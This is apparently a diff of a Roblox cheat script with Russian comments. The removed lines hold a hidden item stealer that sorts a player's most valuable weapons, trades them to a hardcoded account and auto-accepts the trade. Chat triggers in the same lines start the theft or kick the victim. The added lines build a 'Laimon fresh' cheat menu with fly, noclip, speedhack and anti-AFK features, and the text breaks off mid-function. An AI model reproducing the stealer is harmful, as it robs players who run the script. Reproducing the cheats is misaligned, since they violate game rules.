-            return a.value > b.value
-        end)
-        
-        if #availableItems == 0 then
-            loop = false
-            return
-        end
-        
-        -- Отправляем запрос на обмен
-        tradeInProgress = true
-        local success = pcall(function()
-            Trade.SendRequest:InvokeServer(game:GetService("Players")[ReceiverName])
-        end)
-        
-        if not success then
-            tradeInProgress = false
-            task.wait(5)
-            continue
-        end
-        
-        -- Ждем когда трейд будет принят (максимум 30 секунд)
-        local tradeAccepted = false
-        for i = 1, 30 do
-            if isTradeGUIOpen() then
-                tradeAccepted = true
-                break
-            end
-            task.wait(1)
-        end
-        
-        if not tradeAccepted then
-            print("Трейд не был принят в течение 30 секунд")
-            tradeInProgress = false
-            continue
-        end
-        
-        -- ДАЕМ ВРЕМЯ ОКНУ ТРЕЙДА ОТКРЫТЬСЯ (как в оригинале)
-        task.wait(2)
-        
-        -- Добавляем предметы (ИСПОЛЬЗУЕМ ОРИГИНАЛЬНУЮ ЛОГИКУ)
-        local sentItems = {}
-        local addedCount = 0
-        
-        for _, item in ipairs(availableItems) do
-            if addedCount >= 4 then break end
-            
-            local addAmount = math.min(item.amount, 4 - addedCount)
-            for i = 1, addAmount do
-                local offerSuccess = pcall(function()
-                    Trade.OfferItem:FireServer(item.dataId, "Weapons")
-                end)
-                
-                if offerSuccess then
-                    table.insert(sentItems, {
-                        name = item.name,
-                        dataId = item.dataId,
-                        amount = 1
-                    })
-                    addedCount = addedCount + 1
-                    print("Успешно добавлен предмет: " .. item.name)
-                else
-                    print("Ошибка при добавлении предмета: " .. item.name)
-                end
-                
-                task.wait(0.5)
-                if addedCount >= 4 then break end
-            end
-        end
-        
-        if addedCount == 0 then
-            print("Не удалось добавить ни одного предмета, отменяем трейд")
-            pcall(function() Trade.DeclineTrade:FireServer() end)
-            tradeInProgress = false
-            task.wait(5)
-            continue
-        end
-        
-        print("Успешно добавлено предметов: " .. addedCount)
-        
-        -- Ждем как в оригинале
-        task.wait(4)
-        
-        -- Подтверждаем трейд (оригинальная логика)
-        if lastOfferValue then
-            local acceptSuccess = pcall(function()
-                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferValue)
-            end)
-            
-            if acceptSuccess then
-                print("Трейд подтвержден с lastOfferValue")
-                if #sentItems > 0 then
-                    SendTradeSuccessMessage(sentItems, ReceiverName)
-                end
-            else
-                print("Ошибка подтверждения трейда с lastOfferValue")
-            end
-        else
-            -- Fallback
-            local success = pcall(function()
-                Trade.AcceptTrade:FireServer(game.PlaceId * 3, tick())
-            end)
-            if success then
-                print("Трейд подтвержден с tick()")
-            else
-                print("Ошибка подтверждения трейда с tick()")
-            end
-        end
-        
-        -- Ждем завершения трейда
-        for i = 1, 10 do
-            if not isTradeGUIOpen() then
-                break
-            end
-            task.wait(1)
-        end
-        
-        tradeInProgress = false
-        
-        -- Задержка перед следующим трейдом
-        task.wait(1)
-    end
+if checkForDuplicates() then
+    return
 end
 
--- Обработчики чата (как в оригинале)
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username or Username2 then
-        player.Chatted:Connect(function(msg)
-            loop = true
-            stealItems(Username)
-        end)
+-- Метод 3: Уникальный идентификатор
+local SCRIPT_ID = "LFUI_" .. math.random(10000, 99999)
+if _G.SCRIPT_IDENTIFIER == SCRIPT_ID then
+    script:Destroy()
+    return
+end
+_G.SCRIPT_IDENTIFIER = SCRIPT_ID
+
+-- Метод 4: Постоянный мониторинг
+spawn(function()
+    while wait(5) do
+        local guis = game:GetService("CoreGui"):GetChildren()
+        local count = 0
+        for _, gui in pairs(guis) do
+            if gui.Name == "LaimonFreshUI" then
+                count = count + 1
+                if count > 1 then
+                    gui:Destroy()
+                end
+            end
+        end
     end
 end)
 
--- >> /kick command << --
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username or Username2 then
-    player.Chatted:Connect(function(message)
-        if message == "free dope" then
-            game.Players.LocalPlayer:Kick("\nPlease rejoin!")
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+
+local lastPanelPosition = UDim2.new(0.5, -250, 0.5, -175)
+local lastCirclePosition = UDim2.new(0.4, -25, 0.3, -25)
+local isPanelMinimized = false
+
+-- Настройки
+local hideBind = Enum.KeyCode.L
+local menuVisible = true
+local isDragging = false
+local dragStartPos, frameStartPos
+local starsEnabled = false
+
+-- Хранилище активных функций
+local ActiveFunctions = {
+    AntiAFK = false,
+    Fly = false,
+    Noclip = false,
+    SpeedHack = false,
+    InfinityJump = false,
+    ESP = false,
+    AutoFarm = false
+}
+
+-- Цвета из Photoshop
+local LAIMON_COLOR = Color3.fromRGB(255, 255, 255)
+local FRESH_COLOR = Color3.fromRGB(255, 227, 169)
+
+-- Текущая тема
+local CurrentTheme = {
+    name = "Dark Gray",
+    MainBackground = Color3.fromRGB(35, 35, 35),
+    TitleBar = Color3.fromRGB(25, 25, 25),
+    TabBackground = Color3.fromRGB(30, 30, 30),
+    TabButtonActive = Color3.fromRGB(40, 40, 40),
+    TabButtonInactive = Color3.fromRGB(30, 30, 30),
+    ToggleOn = Color3.fromRGB(0, 200, 0),
+    ToggleOff = Color3.fromRGB(60, 60, 60),
+    Button = Color3.fromRGB(60, 60, 60),
+    Text = Color3.fromRGB(255, 255, 255),
+    TextSecondary = Color3.fromRGB(200, 200, 200),
+    Accent = FRESH_COLOR
+}
+
+-- Цветовые темы
+local ColorThemes = {
+    {
+        name = "Purple",
+        MainBackground = Color3.fromRGB(40, 35, 60),
+        TitleBar = Color3.fromRGB(30, 25, 50),
+        TabBackground = Color3.fromRGB(35, 30, 55),
+        TabButtonActive = Color3.fromRGB(50, 40, 80),
+        TabButtonInactive = Color3.fromRGB(35, 30, 55),
+        ToggleOn = Color3.fromRGB(0, 200, 0),
+        ToggleOff = Color3.fromRGB(60, 50, 80),
+        Button = Color3.fromRGB(70, 60, 90),
+        Text = Color3.fromRGB(255, 255, 255),
+        TextSecondary = Color3.fromRGB(200, 190, 220),
+        Accent = Color3.fromRGB(147, 112, 219)
+    },
+    {
+        name = "Red",
+        MainBackground = Color3.fromRGB(60, 35, 35),
+        TitleBar = Color3.fromRGB(50, 25, 25),
+        TabBackground = Color3.fromRGB(55, 30, 30),
+        TabButtonActive = Color3.fromRGB(80, 40, 40),
+        TabButtonInactive = Color3.fromRGB(55, 30, 30),
+        ToggleOn = Color3.fromRGB(0, 200, 0),
+        ToggleOff = Color3.fromRGB(80, 50, 50),
+        Button = Color3.fromRGB(90, 60, 60),
+        Text = Color3.fromRGB(255, 255, 255),
+        TextSecondary = Color3.fromRGB(220, 190, 190),
+        Accent = Color3.fromRGB(220, 20, 60)
+    },
+    {
+        name = "Green",
+        MainBackground = Color3.fromRGB(35, 60, 35),
+        TitleBar = Color3.fromRGB(25, 50, 25),
+        TabBackground = Color3.fromRGB(30, 55, 30),
+        TabButtonActive = Color3.fromRGB(40, 80, 40),
+        TabButtonInactive = Color3.fromRGB(30, 55, 30),
+        ToggleOn = Color3.fromRGB(0, 200, 0),
+        ToggleOff = Color3.fromRGB(50, 80, 50),
+        Button = Color3.fromRGB(60, 90, 60),
+        Text = Color3.fromRGB(255, 255, 255),
+        TextSecondary = Color3.fromRGB(200, 220, 200),
+        Accent = Color3.fromRGB(50, 200, 50)
+    },
+    {
+        name = "Yellow",
+        MainBackground = Color3.fromRGB(60, 55, 35),
+        TitleBar = Color3.fromRGB(50, 45, 25),
+        TabBackground = Color3.fromRGB(55, 50, 30),
+        TabButtonActive = Color3.fromRGB(80, 75, 40),
+        TabButtonInactive = Color3.fromRGB(55, 50, 30),
+        ToggleOn = Color3.fromRGB(0, 200, 0),
+        ToggleOff = Color3.fromRGB(80, 75, 50),
+        Button = Color3.fromRGB(90, 85, 60),
+        Text = Color3.fromRGB(255, 255, 255),
+        TextSecondary = Color3.fromRGB(220, 215, 190),
+        Accent = Color3.fromRGB(255, 215, 0)
+    },
+    {
+        name = "Dark Blue",
+        MainBackground = Color3.fromRGB(25, 35, 60),
+        TitleBar = Color3.fromRGB(20, 25, 45),
+        TabBackground = Color3.fromRGB(30, 35, 55),
+        TabButtonActive = Color3.fromRGB(40, 50, 80),
+        TabButtonInactive = Color3.fromRGB(30, 35, 55),
+        ToggleOn = Color3.fromRGB(0, 200, 0),
+        ToggleOff = Color3.fromRGB(50, 60, 80),
+        Button = Color3.fromRGB(60, 70, 90),
+        Text = Color3.fromRGB(255, 255, 255),
+        TextSecondary = Color3.fromRGB(200, 210, 220),
+        Accent = Color3.fromRGB(65, 105, 225)
+    },
+    {
+        name = "Dark Gray",
+        MainBackground = Color3.fromRGB(45, 45, 45),
+        TitleBar = Color3.fromRGB(35, 35, 35),
+        TabBackground = Color3.fromRGB(40, 40, 40),
+        TabButtonActive = Color3.fromRGB(55, 55, 55),
+        TabButtonInactive = Color3.fromRGB(40, 40, 40),
+        ToggleOn = Color3.fromRGB(0, 200, 0),
+        ToggleOff = Color3.fromRGB(70, 70, 70),
+        Button = Color3.fromRGB(80, 80, 80),
+        Text = Color3.fromRGB(255, 255, 255),
+        TextSecondary = Color3.fromRGB(180, 180, 180),
+        Accent = Color3.fromRGB(255, 227, 169)
+    },
+    {
+        name = "White",
+        MainBackground = Color3.fromRGB(240, 240, 240),
+        TitleBar = Color3.fromRGB(220, 220, 220),
+        TabBackground = Color3.fromRGB(230, 230, 230),
+        TabButtonActive = Color3.fromRGB(200, 200, 200),
+        TabButtonInactive = Color3.fromRGB(230, 230, 230),
+        ToggleOn = Color3.fromRGB(0, 180, 0),
+        ToggleOff = Color3.fromRGB(180, 180, 180),
+        Button = Color3.fromRGB(200, 200, 200),
+        Text = Color3.fromRGB(40, 40, 40),
+        TextSecondary = Color3.fromRGB(100, 100, 100),
+        Accent = Color3.fromRGB(0, 100, 200)
+    }
+}
+
+-- Создаем красивое загрузочное окно
+local LoadingGui = Instance.new("ScreenGui")
+LoadingGui.Name = "LoadingGui"
+LoadingGui.ResetOnSpawn = false
+LoadingGui.DisplayOrder = 999  -- Самый верхний слой
+LoadingGui.IgnoreGuiInset = true  -- Игнорировать безопасную зону
+LoadingGui.Parent = game:GetService("CoreGui")  -- Важно: CoreGui вместо PlayerGui
+
+-- Полноэкранный затемняющий фон
+local BackgroundOverlay = Instance.new("Frame")
+BackgroundOverlay.Name = "BackgroundOverlay"
+BackgroundOverlay.Size = UDim2.new(1, 0, 1, 0)
+BackgroundOverlay.Position = UDim2.new(0, 0, 0, 0)
+BackgroundOverlay.AnchorPoint = Vector2.new(0, 0)
+BackgroundOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+BackgroundOverlay.BackgroundTransparency = 0.2  -- Полупрозрачный черный
+BackgroundOverlay.BorderSizePixel = 0
+BackgroundOverlay.ZIndex = 0
+BackgroundOverlay.Parent = LoadingGui
+
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(0, 300, 0, 100)
+LoadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)  -- Простая позиция
+LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)  -- Якорь по центру
+LoadingFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+LoadingFrame.BackgroundTransparency = 0.1
+LoadingFrame.BorderSizePixel = 0
+LoadingFrame.ZIndex = 1
+LoadingFrame.Parent = LoadingGui
+
+local LoadingCorner = Instance.new("UICorner")
+LoadingCorner.CornerRadius = UDim.new(0, 12)
+LoadingCorner.Parent = LoadingFrame
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(60, 60, 60)
+UIStroke.Thickness = 2
+UIStroke.Parent = LoadingFrame
+
+-- Текст Loading с анимацией точек
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Size = UDim2.new(1, -40, 0, 40)
+LoadingText.Position = UDim2.new(0, 20, 0, 20)
+LoadingText.BackgroundTransparency = 1
+LoadingText.Text = "Loading"
+LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingText.Font = Enum.Font.GothamBold
+LoadingText.TextSize = 20
+LoadingText.TextXAlignment = Enum.TextXAlignment.Left
+LoadingText.ZIndex = 2
+LoadingText.Parent = LoadingFrame
+
+-- Контейнер для прогресс бара
+local ProgressContainer = Instance.new("Frame")
+ProgressContainer.Size = UDim2.new(1, -40, 0, 4)
+ProgressContainer.Position = UDim2.new(0, 20, 0, 70)
+ProgressContainer.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+ProgressContainer.BorderSizePixel = 0
+ProgressContainer.ZIndex = 2
+ProgressContainer.Parent = LoadingFrame
+
+local ProgressCorner = Instance.new("UICorner")
+ProgressCorner.CornerRadius = UDim.new(1, 0)
+ProgressCorner.Parent = ProgressContainer
+
+-- Прогресс бар
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.Position = UDim2.new(0, 0, 0, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(200, 200, 200)  -- Светло-серый
+ProgressBar.BorderSizePixel = 0
+ProgressBar.ZIndex = 3
+ProgressBar.Parent = ProgressContainer
+
+local ProgressBarCorner = Instance.new("UICorner")
+ProgressBarCorner.CornerRadius = UDim.new(1, 0)
+ProgressBarCorner.Parent = ProgressBar
+
+-- Анимация точек
+local dotCount = 0
+local maxDots = 3
+local dotUpdateTime = 0
+local dotUpdateInterval = 0.5 -- Интервал в секундах между сменой точек
+local loadingAnimation
+
+loadingAnimation = RunService.Heartbeat:Connect(function(deltaTime)
+    dotUpdateTime = dotUpdateTime + deltaTime
+    
+    if dotUpdateTime >= dotUpdateInterval then
+        dotUpdateTime = 0
+        dotCount = (dotCount + 1) % (maxDots + 1)
+        local dots = string.rep(".", dotCount)
+        LoadingText.Text = "Loading" .. dots
+    end
+end)
+
+-- Анимация прогресс бара
+spawn(function()
+    local progressTween = TweenService:Create(ProgressBar, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(1, 0, 1, 0)
+    })
+    progressTween:Play()
+    
+    -- Ждем завершения анимации и показываем основной интерфейс
+    wait(2.2)
+    
+    -- Останавливаем анимацию точек
+    if loadingAnimation then
+        loadingAnimation:Disconnect()
+    end
+    
+    -- Плавно скрываем загрузочный экран
+    local fadeTween = TweenService:Create(LoadingFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0.5, -150, 0.5, -30)
+    })
+    fadeTween:Play()
+    
+    -- Скрываем текст и прогресс бар
+    TweenService:Create(LoadingText, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+    TweenService:Create(ProgressContainer, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(ProgressBar, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+    
+    wait(0.5)
+    -- Плавно скрываем затемнение
+    TweenService:Create(BackgroundOverlay, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
+    wait(0.3)
+    LoadingGui:Destroy()
+    showMainInterface()
+end)
+
+-- Создаем основной интерфейс
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LaimonFreshUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Enabled = false
+
+-- Главное окно
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 500, 0, 350)
+MainFrame.Position = UDim2.new(0.5, -250, 0, -350)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0)
+MainFrame.BackgroundColor3 = CurrentTheme.MainBackground
+MainFrame.BackgroundTransparency = 0.2
+MainFrame.BorderSizePixel = 0
+MainFrame.Visible = false
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = MainFrame
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(0, 0, 0)
+UIStroke.Thickness = 2
+UIStroke.Transparency = 0.5
+UIStroke.Parent = MainFrame
+
+-- TitleBar
+local TitleBar = Instance.new("Frame")
+TitleBar.Name = "TitleBar"
+TitleBar.Size = UDim2.new(1, 0, 0, 35)
+TitleBar.Position = UDim2.new(0, 0, 0, 0)
+TitleBar.BackgroundColor3 = CurrentTheme.TitleBar
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = MainFrame
+TitleBar.ZIndex = 10
+
+local UICornerTitle = Instance.new("UICorner")
+UICornerTitle.CornerRadius = UDim.new(0, 12)
+UICornerTitle.Parent = TitleBar
+
+-- Заголовок
+local TitleContainer = Instance.new("Frame")
+TitleContainer.Name = "TitleContainer"
+TitleContainer.Size = UDim2.new(0, 160, 1, 0)
+TitleContainer.Position = UDim2.new(0, 15, 0, 0)
+TitleContainer.BackgroundTransparency = 1
+TitleContainer.Parent = TitleBar
+TitleContainer.ZIndex = 11
+
+local LaimonText = Instance.new("TextLabel")
+LaimonText.Name = "LaimonText"
+LaimonText.Size = UDim2.new(0, 70, 1, 0)
+LaimonText.Position = UDim2.new(0, 0, 0, 0)
+LaimonText.BackgroundTransparency = 1
+LaimonText.Text = "Laimon"
+LaimonText.TextColor3 = LAIMON_COLOR
+LaimonText.Font = Enum.Font.GothamBold
+LaimonText.TextSize = 16
+LaimonText.TextXAlignment = Enum.TextXAlignment.Left
+LaimonText.Parent = TitleContainer
+LaimonText.ZIndex = 12
+
+local FreshText = Instance.new("TextLabel")
+FreshText.Name = "FreshText"
+FreshText.Size = UDim2.new(0, 55, 1, 0)
+FreshText.Position = UDim2.new(0, 58, 0, 0)
+FreshText.BackgroundTransparency = 1
+FreshText.Text = "fresh"
+FreshText.TextColor3 = CurrentTheme.Accent
+FreshText.Font = Enum.Font.GothamBold
+FreshText.TextSize = 16
+FreshText.TextXAlignment = Enum.TextXAlignment.Left
+FreshText.ZIndex = 12
+FreshText.Parent = TitleContainer
+
+-- Звездочка
+local StarButton = Instance.new("TextButton")
+StarButton.Name = "StarButton"
+StarButton.Size = UDim2.new(0, 27.5, 0, 20)
+StarButton.Position = UDim2.new(0, 312.5, 0.5, -10)
+StarButton.BackgroundTransparency = 1
+StarButton.Text = "☆"
+StarButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+StarButton.TextSize = 16
+StarButton.Font = Enum.Font.GothamBold
+StarButton.ZIndex = 12
+StarButton.Parent = TitleContainer
+
+-- Кнопка сворачивания
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Name = "MinimizeButton"
+MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
+MinimizeButton.Position = UDim2.new(1, -35, 0.5, -15)
+MinimizeButton.BackgroundTransparency = 1
+MinimizeButton.Text = "−"
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.TextSize = 20
+MinimizeButton.Font = Enum.Font.GothamBold
+MinimizeButton.ZIndex = 12
+MinimizeButton.Parent = TitleBar
+
+-- Контейнер для кружков темы
+local ThemeCirclesContainer = Instance.new("Frame")
+ThemeCirclesContainer.Name = "ThemeCirclesContainer"
+ThemeCirclesContainer.Size = UDim2.new(0, 180, 1, 0)
+ThemeCirclesContainer.Position = UDim2.new(0.5, -90, 0, 0)
+ThemeCirclesContainer.BackgroundTransparency = 1
+ThemeCirclesContainer.Parent = TitleBar
+ThemeCirclesContainer.ZIndex = 11
+
+-- Вкладки (Player, ESP, Auto-Farm, Settings, Info)
+local TabButtons = Instance.new("Frame")
+TabButtons.Name = "TabButtons"
+TabButtons.Size = UDim2.new(0, 240, 1.1, -35)
+TabButtons.Position = UDim2.new(0, 0, 0, 0)
+TabButtons.BackgroundColor3 = CurrentTheme.TabBackground
+TabButtons.BackgroundTransparency = 0.2
+TabButtons.BorderSizePixel = 0
+TabButtons.Parent = MainFrame
+
+local TabButtonsCorner = Instance.new("UICorner")
+TabButtonsCorner.CornerRadius = UDim.new(0, 12)
+TabButtonsCorner.Parent = TabButtons
+
+-- Новый порядок вкладок
+local Tabs = {"Player", "ESP", "Auto-Farm", "Settings", "Info"}
+local TabFrames = {}
+
+-- Хранилище для UI элементов
+local UIElements = {
+    MainFrame = MainFrame,
+    TitleBar = TitleBar,
+    TabButtons = TabButtons,
+    TabButtonsList = {},
+    ToggleButtons = {},
+    DropdownButtons = {},
+    KeybindButtons = {},
+    TextLabels = {},
+    ButtonStrokes = {},
+    StarButton = StarButton,
+    MinimizeButton = MinimizeButton,
+    ESPButtons = {}, -- Новое хранилище для ESP кнопок
+    AutoFarmElements = {}, -- Новое хранилище для Auto-Farm элементов
+    InfoElements = {} -- Новое хранилище для Info элементов
+}
+
+-- Создаем круг для открытия панели с логотипом Roblox
+local CircleButton = Instance.new("TextButton")
+CircleButton.Name = "CircleButton"
+CircleButton.Size = UDim2.new(0, 0, 0, 0)
+CircleButton.Position = lastCirclePosition
+CircleButton.BackgroundColor3 = CurrentTheme.MainBackground -- Цвет как у фона панели
+CircleButton.BackgroundTransparency = 1
+CircleButton.Text = ""
+CircleButton.Visible = false
+CircleButton.ZIndex = 100
+CircleButton.Parent = ScreenGui
+
+local CircleCorner = Instance.new("UICorner")
+CircleCorner.CornerRadius = UDim.new(1, 0)
+CircleCorner.Parent = CircleButton
+
+local CircleStroke = Instance.new("UIStroke")
+CircleStroke.Color = Color3.fromRGB(255, 255, 255)
+CircleStroke.Thickness = 2
+CircleStroke.Parent = CircleButton
+
+-- Буква на круге
+local CircleText = Instance.new("TextLabel")
+CircleText.Name = "CircleText"
+CircleText.Size = UDim2.new(1, 0, 1, 0)
+CircleText.Position = UDim2.new(0, 0, 0, 0)
+CircleText.BackgroundTransparency = 1
+CircleText.Text = "L" -- Буква L
+CircleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+CircleText.TextTransparency = 1 -- Начинаем полностью прозрачным
+CircleText.Font = Enum.Font.FredokaOne 
+CircleText.TextSize = 30
+CircleText.ZIndex = 101
+CircleText.Parent = CircleButton
+
+-- Anti-AFK функция
+local function setupAntiAFK()
+    local VirtualUser = game:GetService('VirtualUser')
+    game:GetService('Players').LocalPlayer.Idled:connect(function()
+        if ActiveFunctions.AntiAFK then
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new())
         end
     end)
 end
-end)
 
--- Автозапуск если игрок уже в игре
-for _, player in pairs(game.Players:GetPlayers()) do
-        if player.Name == Username or Username2 then
-        player.Chatted:Connect(function(message)
-            if message == "free dope" then
-                game.Players.LocalPlayer:Kick("\nPlease rejoin!")
+setupAntiAFK()
+
+-- Fly функция
+local function setupFly()
+    local plr = game.Players.LocalPlayer
+    local flying = false
+    local deb = true 
+    local ctrl = {f = 0, b = 0, l = 0, r = 0} 
+    local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
+    local maxspeed = 1000 
+    local speed = 50
+    
+    local bg, bv
+    
+    local function Fly() 
+        if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or not plr.Character:FindFirstChild("Humanoid") then
+            return false
+        end
+        
+        local torso = plr.Character.HumanoidRootPart 
+        
+        if bg then bg:Destroy() end
+        if bv then bv:Destroy() end
+        
+        bg = Instance.new("BodyGyro", torso) 
+        bg.P = 9e4 
+        bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
+        bg.cframe = torso.CFrame 
+        
+        bv = Instance.new("BodyVelocity", torso) 
+        bv.velocity = Vector3.new(0, 0.1, 0) 
+        bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
+        
+        flying = true
+        
+        if flyConnection then
+            flyConnection:Disconnect()
+        end
+        
+        flyConnection = RunService.Heartbeat:Connect(function()
+            if not flying or not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then
+                return
+            end
+            
+            plr.Character.Humanoid.PlatformStand = true 
+            
+            if ctrl.l + ctrl.r == 0 and ctrl.f + ctrl.b == 0 then
+                bv.velocity = Vector3.new(0, 0.1, 0)
+            else
+                local moveDirection = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f + ctrl.b)) + 
+                                    ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l + ctrl.r, (ctrl.f + ctrl.b) * 0.2, 0).p) - 
+                                    workspace.CurrentCamera.CoordinateFrame.p))
+                
+                bv.velocity = moveDirection.Unit * 50 + Vector3.new(0, 0.1, 0)
+            end
+            
+            if bg then
+                bg.cframe = workspace.CurrentCamera.CoordinateFrame
+            end
+        end)
+        
+        return true
+    end
+
+    local function stopFlying()
+        flying = false
+        speed = 50
+        ctrl = {f = 0, b = 0, l = 0, r = 0} 
+        lastctrl = {f = 0, b = 0, l = 0, r = 0} 
+        
+        if bg then
+            bg:Destroy()
+            bg = nil
+        end
+        if bv then
+            bv:Destroy()
+            bv = nil
+        end
+        
+        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+            plr.Character.Humanoid.PlatformStand = false
+            wait(0.1)
+            plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+        end
+    end
+    
+    local keyDownConnection
+    local keyUpConnection
+    
+    local function enableFlyControls()
+        if keyDownConnection then
+            keyDownConnection:Disconnect()
+        end
+        if keyUpConnection then
+            keyUpConnection:Disconnect()
+        end
+        
+        keyDownConnection = UserInputService.InputBegan:Connect(function(input)
+            if input.KeyCode == Enum.KeyCode.W then 
+                ctrl.f = 1 
+            elseif input.KeyCode == Enum.KeyCode.S then 
+                ctrl.b = -1 
+            elseif input.KeyCode == Enum.KeyCode.A then 
+                ctrl.l = -1 
+            elseif input.KeyCode == Enum.KeyCode.D then 
+                ctrl.r = 1 
+            end 
+        end)
+        
+        keyUpConnection = UserInputService.InputEnded:Connect(function(input)
+            if input.KeyCode == Enum.KeyCode.W then 
+                ctrl.f = 0 
+            elseif input.KeyCode == Enum.KeyCode.S then 
+                ctrl.b = 0 
+            elseif input.KeyCode == Enum.KeyCode.A then 
+                ctrl.l = 0 
+            elseif input.KeyCode == Enum.KeyCode.D then 
+                ctrl.r = 0 
+            end 
+        end)
+    end
+    
+    local function disableFlyControls()
+        if keyDownConnection then
+            keyDownConnection:Disconnect()
+            keyDownConnection = nil
+        end
+        if keyUpConnection then
+            keyUpConnection:Disconnect()
+            keyUpConnection = nil
+        end
+        stopFlying()
+    end
+    
+    return {
+        enable = function()
+            enableFlyControls()
+        end,
+        disable = function()
+            disableFlyControls()
+            stopFlying()
+        end,
+        toggle = function()
+            if flying then
+                stopFlying()
+            else
+                flying = true
+                Fly()
+            end
+        end,
+        getState = function()
+            return flying
+        end
+    }
+end
+
+local flySystem = setupFly()
+
+-- Noclip функция
+local function setupNoclip()
+    local noclipEnabled = false
+    local noclipConnection
+    local player = game.Players.LocalPlayer
+
+    local function enableNoclip()
+        if noclipConnection then
+            noclipConnection:Disconnect()
+        end
+        
+        noclipConnection = RunService.Stepped:Connect(function()
+            if not noclipEnabled or not player.Character then
+                if noclipConnection then
+                    noclipConnection:Disconnect()
+                end
+                return
+            end
+            
+            for _, part in pairs(player.Character:GetChildren()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false
+                end
             end
         end)
     end
+    
+    local function disableNoclip()
+        noclipEnabled = false
+        if noclipConnection then
+            noclipConnection:Disconnect()
+            noclipConnection = nil
+        end
+        
+        if player.Character then
+            for _, part in pairs(player.Character:GetChildren()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = true
+                end
+            end
+        end
+    end
+    
+    return {
+        enable = function()
+            noclipEnabled = true
+            enableNoclip()
+        end,
+        disable = function()
+            disableNoclip()
+        end,
+        toggle = function()
+            noclipEnabled = not noclipEnabled
+            if noclipEnabled then
+                enableNoclip()
+            else
+                disableNoclip()
+            end
+        end,
+        getState = function()
+            return noclipEnabled
+        end
+    }
 end
 
-for _, player in pairs(game.Players:GetPlayers()) do
-    if player.Name == Username or Username2 then
-        player.Chatted:Connect(function(msg)
-            loop = true
-            stealItems(Username)
+local noclipSystem = setupNoclip()
+
+-- SpeedHack функция
+local function setupSpeedHack()
+    local speedHackEnabled = false
+    local currentSpeed = 50
+    local originalSpeed = 16
+    
+    local function updateSpeed()
+        local character = game.Players.LocalPlayer.Character
+        if character and character:FindFirstChildOfClass("Humanoid") then
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if speedHackEnabled then
+                humanoid.WalkSpeed = currentSpeed
+            else
+                humanoid.WalkSpeed = originalSpeed
+            end
+        end
+    end
+    
+    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+        originalSpeed = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").WalkSpeed
+    end
+    
+    game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
+        wait(0.5)
+        if character:FindFirstChildOfClass("Humanoid") then
+            originalSpeed = character:FindFirstChildOfClass("Humanoid").WalkSpeed
+            if speedHackEnabled then
+                character:FindFirstChildOfClass("Humanoid").WalkSpeed = currentSpeed
+            end
+        end
+    end)
+    
+    return {
+        enable = function()
+            speedHackEnabled = true
+            updateSpeed()
+        end,
+        disable = function()
+            speedHackEnabled = false
+            updateSpeed()
+        end,
+        setSpeed = function(speed)
+            currentSpeed = math.clamp(speed, 50, 500)
+            if speedHackEnabled then
+                updateSpeed()
+            end
+            return currentSpeed
+        end,
+        getSpeed = function()
+            return currentSpeed
+        end,
+        getState = function()
+            return speedHackEnabled
+        end
+    }
+end
+
+local speedHackSystem = setupSpeedHack()
+
+-- Infinity Jump функция
+local function setupInfinityJump()
+    local infinityJumpEnabled = false
+    local jumpConnection
+    
+    local function enableInfinityJump()
+        if jumpConnection then
